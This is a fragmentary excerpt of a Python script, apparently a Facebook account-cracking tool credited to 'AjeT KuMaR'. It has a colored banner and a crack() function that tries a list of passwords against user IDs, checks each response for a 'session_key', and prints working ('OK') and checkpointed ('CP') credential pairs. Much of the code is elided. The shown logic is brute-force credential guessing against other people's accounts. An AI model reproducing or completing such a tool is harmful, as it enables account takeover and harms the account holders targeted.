...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : AjeT KuMaR
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/profile.php?id=100000975177506&mibextid=ZbWKwL
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/ajetkumar
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[AjeTkuMar] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [AjeT-OK] {uid} | {pw}")
                ...
                print(f"\r{cpclr} [AjeT-CP] {uid} | {pw}")
